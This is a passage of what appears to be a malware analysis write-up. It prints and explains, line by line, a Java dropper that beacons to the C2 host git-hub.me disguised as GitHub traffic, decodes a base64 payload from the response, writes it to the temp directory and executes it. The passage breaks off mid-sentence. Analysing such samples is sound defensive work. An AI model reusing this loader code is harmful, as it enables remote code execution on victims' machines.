+<span id="cb22-73"><a href="#cb22-73" aria-hidden="true" tabindex="-1"></a>                HttpResponse<span class="op">&lt;</span><span class="bu">String</span><span class="op">&gt;</span> response <span class="op">=</span> client<span class="op">.</span><span class="fu">send</span><span class="op">(</span>request<span class="op">,</span> HttpResponse<span class="op">.</span><span class="fu">BodyHandlers</span><span class="op">.</span><span class="fu">ofString</span><span class="op">());</span></span>
+<span id="cb22-74"><a href="#cb22-74" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>response<span class="op">.</span><span class="fu">statusCode</span><span class="op">()</span> <span class="op">!=</span> <span class="dv">200</span><span class="op">)</span></span>
+<span id="cb22-75"><a href="#cb22-75" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
+<span id="cb22-76"><a href="#cb22-76" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">5000</span><span class="op">);</span></span>
+<span id="cb22-77"><a href="#cb22-77" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">continue</span><span class="op">;</span></span>
+<span id="cb22-78"><a href="#cb22-78" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb22-79"><a href="#cb22-79" aria-hidden="true" tabindex="-1"></a>                <span class="bu">String</span> resStr <span class="op">=</span> response<span class="op">.</span><span class="fu">body</span><span class="op">();</span></span>
+<span id="cb22-80"><a href="#cb22-80" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(!</span>resStr<span class="op">.</span><span class="fu">startsWith</span><span class="op">(</span><span class="st">&quot;GITHUB_RES&quot;</span><span class="op">))</span></span>
+<span id="cb22-81"><a href="#cb22-81" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
+<span id="cb22-82"><a href="#cb22-82" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span><span class="st">&quot;Data Error&quot;</span><span class="op">);</span></span>
+<span id="cb22-83"><a href="#cb22-83" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb22-84"><a href="#cb22-84" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>resStr<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">11</span><span class="op">)</span></span>
+<span id="cb22-85"><a href="#cb22-85" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
+<span id="cb22-86"><a href="#cb22-86" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> enc_data <span class="op">=</span> resStr<span class="op">.</span><span class="fu">substring</span><span class="op">(</span><span class="dv">10</span><span class="op">);</span></span>
+<span id="cb22-87"><a href="#cb22-87" aria-hidden="true" tabindex="-1"></a>                    <span class="dt">byte</span> <span class="op">[]</span> dec_data <span class="op">=</span> Base64<span class="op">.</span><span class="fu">getDecoder</span><span class="op">().</span><span class="fu">decode</span><span class="op">(</span>enc_data<span class="op">);</span></span>
+<span id="cb22-88"><a href="#cb22-88" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> org_file <span class="op">=</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">(</span>dec_data<span class="op">,</span> StandardCharsets<span class="op">.</span><span class="fu">UTF_8</span><span class="op">);</span></span>
+<span id="cb22-89"><a href="#cb22-89" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> org_path<span class="op">;</span></span>
+<span id="cb22-90"><a href="#cb22-90" aria-hidden="true" tabindex="-1"></a>                    </span>
+<span id="cb22-91"><a href="#cb22-91" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span><span class="fu">getOperatingSystem</span><span class="op">())</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span></span>
+<span id="cb22-92"><a href="#cb22-92" aria-hidden="true" tabindex="-1"></a>                    <span class="op">{</span></span>
+<span id="cb22-93"><a href="#cb22-93" aria-hidden="true" tabindex="-1"></a>                        org_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">prefTmp.java&quot;</span><span class="op">;</span></span>
+<span id="cb22-94"><a href="#cb22-94" aria-hidden="true" tabindex="-1"></a>                        sec_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">p.dat&quot;</span><span class="op">;</span></span>
+<span id="cb22-95"><a href="#cb22-95" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb22-96"><a href="#cb22-96" aria-hidden="true" tabindex="-1"></a>                        org_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;/prefTmp.java&quot;</span><span class="op">;</span></span>
+<span id="cb22-97"><a href="#cb22-97" aria-hidden="true" tabindex="-1"></a>                        sec_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;/p.dat&quot;</span><span class="op">;</span></span>
+<span id="cb22-98"><a href="#cb22-98" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
+<span id="cb22-99"><a href="#cb22-99" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">try</span> <span class="op">(</span><span class="bu">FileWriter</span> file <span class="op">=</span> <span class="kw">new</span> <span class="bu">FileWriter</span><span class="op">(</span>org_path<span class="op">,</span> <span class="kw">true</span><span class="op">);</span><span class="bu">BufferedWriter</span> buffer <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedWriter</span><span class="op">(</span>file<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb22-100"><a href="#cb22-100" aria-hidden="true" tabindex="-1"></a>                        buffer<span class="op">.</span><span class="fu">write</span><span class="op">(</span>org_file<span class="op">);</span></span>
+<span id="cb22-101"><a href="#cb22-101" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
+<span id="cb22-102"><a href="#cb22-102" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> cmdline <span class="op">=</span> <span class="st">&quot;java &quot;</span> <span class="op">+</span> org_path <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> uid <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> POST_URL<span class="op">;</span></span>
+<span id="cb22-103"><a href="#cb22-103" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">Runtime</span><span class="op">.</span><span class="fu">getRuntime</span><span class="op">().</span><span class="fu">exec</span><span class="op">(</span>cmdline<span class="op">);</span></span>
+<span id="cb22-104"><a href="#cb22-104" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">3000</span><span class="op">);</span></span>
+<span id="cb22-105"><a href="#cb22-105" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb22-106"><a href="#cb22-106" aria-hidden="true" tabindex="-1"></a>                <span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">5000</span><span class="op">);</span></span>
+<span id="cb22-107"><a href="#cb22-107" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb22-108"><a href="#cb22-108" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">InterruptedException</span> ex<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb22-109"><a href="#cb22-109" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb22-110"><a href="#cb22-110" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb22-111"><a href="#cb22-111" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb22-112"><a href="#cb22-112" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+</details>
+<p>What does this code do?</p>
+<ul>
+<li>Multiple imports to grant the snippet ability to make HTTP
+connections, encode and decode Base64, manipulate files, throw random
+numbers and use threading</li>
+</ul>
+<div class="sourceCode" id="cb23"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">IOException</span><span class="op">;</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">URI</span><span class="op">;</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpClient</span><span class="op">;</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpRequest</span><span class="op">;</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpResponse</span><span class="op">;</span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">nio</span><span class="op">.</span><span class="im">charset</span><span class="op">.</span><span class="im">StandardCharsets</span><span class="op">;</span></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">util</span><span class="op">.</span><span class="im">Base64</span><span class="op">;</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">util</span><span class="op">.</span><span class="im">Random</span><span class="op">;</span></span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">BufferedWriter</span><span class="op">;</span></span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">File</span><span class="op">;</span></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">FileWriter</span><span class="op">;</span></span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">lang</span><span class="op">.</span><span class="im">Thread</span><span class="op">;</span></span></code></pre></div>
+<ul>
+<li>Declares the malicious site git-hub.me/view.php, where a POST
+request will be sent soon.</li>
+</ul>
+<div class="sourceCode" id="cb24"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">final</span> <span class="bu">String</span> POST_URL <span class="op">=</span> <span class="st">&quot;https://www.git-hub.me/view.php&quot;</span><span class="op">;</span></span></code></pre></div>
+<ul>
+<li>Declares a 8-character random string composed by numbers, which will
+be later used to create a temporary directory.</li>
+</ul>
+<div class="sourceCode" id="cb25"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">randGen</span><span class="op">()</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>  <span class="bu">String</span> strPool <span class="op">=</span> <span class="st">&quot;123456789&quot;</span><span class="op">;</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">StringBuilder</span> sb <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>  <span class="bu">Random</span> rand <span class="op">=</span> <span class="kw">new</span> <span class="bu">Random</span><span class="op">();</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span> i<span class="op">&lt;</span><span class="dv">8</span><span class="op">;</span> i<span class="op">++){</span></span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a>      sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span>strPool<span class="op">.</span><span class="fu">charAt</span><span class="op">(</span>rand<span class="op">.</span><span class="fu">nextInt</span><span class="op">(</span>strPool<span class="op">.</span><span class="fu">length</span><span class="op">())));</span></span>
+<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> sb<span class="op">.</span><span class="fu">toString</span><span class="op">();</span></span>
+<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Identifies operating system in a basic way (just by platform
+name).</li>
+</ul>
+<div class="sourceCode" id="cb26"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">getOperatingSystem</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a>  <span class="bu">String</span> os <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;os.name&quot;</span><span class="op">);</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">String</span> result <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Windows&quot;</span><span class="op">))</span></span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> <span class="st">&quot;0&quot;</span><span class="op">;</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Linux&quot;</span><span class="op">))</span></span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> <span class="st">&quot;2&quot;</span><span class="op">;</span></span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Mac OS X&quot;</span><span class="op">))</span></span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> <span class="st">&quot;1&quot;</span><span class="op">;</span></span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> result<span class="op">;</span></span>
+<span id="cb26-12"><a href="#cb26-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Crafts a POST request to git-hub.me containing a random generated
+uid and the identified OS, disguised as arguments from a legit-looking
+github query (using parameters as GITHUB_REQ).</li>
+</ul>
+<div class="sourceCode" id="cb27"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">sendPOST</span><span class="op">()</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> uid <span class="op">=</span> <span class="fu">randGen</span><span class="op">();</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>        <span class="bu">StringBuilder</span> data <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> sec_path <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;GITHUB_REQ&quot;</span><span class="op">);</span></span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span>uid<span class="op">);</span></span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;2000&quot;</span><span class="op">);</span></span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="fu">getOperatingSystem</span><span class="op">());</span></span></code></pre></div>
+<ul>
+<li>Checks for the existence of a flag file, indicating wether the
+attack was carried before on the infected machine. If the file is not
+present it will send the request as JSON and create said flag.</li>
+</ul>
+<div class="sourceCode" id="cb28"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>sec_path<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a>      <span class="bu">File</span> secFile <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>sec_path<span class="op">);</span></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>secFile<span class="op">.</span><span class="fu">exists</span><span class="op">())</span></span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a>          <span class="bu">System</span><span class="op">.</span><span class="fu">exit</span><span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a>  HttpRequest request <span class="op">=</span> HttpRequest<span class="op">.</span><span class="fu">newBuilder</span><span class="op">()</span></span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">header</span><span class="op">(</span><span class="st">&quot;Content-Type&quot;</span><span class="op">,</span> <span class="st">&quot;application/json; charset=utf-8&quot;</span><span class="op">)</span></span>
+<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">version</span><span class="op">(</span>HttpClient<span class="op">.</span><span class="fu">Version</span><span class="op">.</span><span class="fu">HTTP_1_1</span><span class="op">)</span></span>
+<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">uri</span><span class="op">(</span><span class="bu">URI</span><span class="op">.</span><span class="fu">create</span><span class="op">(</span>POST_URL<span class="op">))</span></span>
+<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">POST</span><span class="op">(</span>HttpRequest<span class="op">.</span><span class="fu">BodyPublishers</span><span class="op">.</span><span class="fu">ofString</span><span class="op">(</span>data<span class="op">.</span><span class="fu">toString</span><span class="op">()))</span></span>
+<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">build</span><span class="op">();</span></span>
+<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a>  HttpClient client <span class="op">=</span> HttpClient<span class="op">.</span><span class="fu">newHttpClient</span><span class="op">();</span></span>
+<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a>  HttpResponse<span class="op">&lt;</span><span class="bu">String</span><span class="op">&gt;</span> response <span class="op">=</span> client<span class="op">.</span><span class="fu">send</span><span class="op">(</span>request<span class="op">,</span> HttpResponse<span class="op">.</span><span class="fu">BodyHandlers</span><span class="op">.</span><span class="fu">ofString</span><span class="op">());</span></span></code></pre></div>
+<ul>
+<li>If the POST request is not well received (status 200), the code will
+sleep for 5 seconds. From now on all communications must come back
+labeled with “GITHUB_RES” indicating the C2 is the intended receiver of
+the message. Responses that come back without that pattern won’t be
+honored.</li>
+</ul>
+<div class="sourceCode" id="cb29"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>response<span class="op">.</span><span class="fu">statusCode</span><span class="op">()</span> <span class="op">!=</span> <span class="dv">200</span><span class="op">)</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">5000</span><span class="op">);</span></span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">continue</span><span class="op">;</span></span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> resStr <span class="op">=</span> response<span class="op">.</span><span class="fu">body</span><span class="op">();</span></span>
+<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(!</span>resStr<span class="op">.</span><span class="fu">startsWith</span><span class="op">(</span><span class="st">&quot;GITHUB_RES&quot;</span><span class="op">))</span></span>
+<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a>  <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span><span class="st">&quot;Data Error&quot;</span><span class="op">);</span></span>
+<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span></code></pre></div>
+<ul>
+<li>After the initial “dialogue” with the C2 and depending on the
+operating system used by the victim, malware will check if received
+response is longer than 11 chars. If so, it will take the first 10 and
+base64 decode them. Then those characters will be cast to UTF-8.</li>
+</ul>
+<div class="sourceCode" id="cb30"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>resStr<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">11</span><span class="op">)</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> enc_data <span class="op">=</span> resStr<span class="op">.</span><span class="fu">substring</span><span class="op">(</span><span class="dv">10</span><span class="op">);</span></span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">byte</span> <span class="op">[]</span> dec_data <span class="op">=</span> Base64<span class="op">.</span><span class="fu">getDecoder</span><span class="op">().</span><span class="fu">decode</span><span class="op">(</span>enc_data<span class="op">);</span></span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> org_file <span class="op">=</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">(</span>dec_data<span class="op">,</span> StandardCharsets<span class="op">.</span><span class="fu">UTF_8</span><span class="op">);</span></span>
+<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> org_path<span class="op">;</span></span>
+<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Then the malware will drop two files on the temporary directory:
+p.dat and prefTmp.java. The later will receive the 10 characters decoded
+on the previous step.</li>
+</ul>
+<div class="sourceCode" id="cb31"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span><span class="fu">getOperatingSystem</span><span class="op">())</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a>    org_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">prefTmp.java&quot;</span><span class="op">;</span></span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a>    sec_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">p.dat&quot;</span><span class="op">;</span></span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a>    org_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;/prefTmp.java&quot;</span><span class="op">;</span></span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a>    sec_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;/p.dat&quot;</span><span class="op">;</span></span>
+<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb31-9"><a href="#cb31-9" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span> <span class="op">(</span><span class="bu">FileWriter</span> file <span class="op">=</span> <span class="kw">new</span> <span class="bu">FileWriter</span><span class="op">(</span>org_path<span class="op">,</span> <span class="kw">true</span><span class="op">);</span><span class="bu">BufferedWriter</span> buffer <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedWriter</span><span class="op">(</span>file<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb31-10"><a href="#cb31-10" aria-hidden="true" tabindex="-1"></a>    buffer<span class="op">.</span><span class="fu">write</span><span class="op">(</span>org_file<span class="op">);</span></span>
+<span id="cb31-11"><a href="#cb31-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Then the command java $TEMP/prefTmp.java $UID
+https://www.git-hub.me/view.php is executed, acting as a reverse
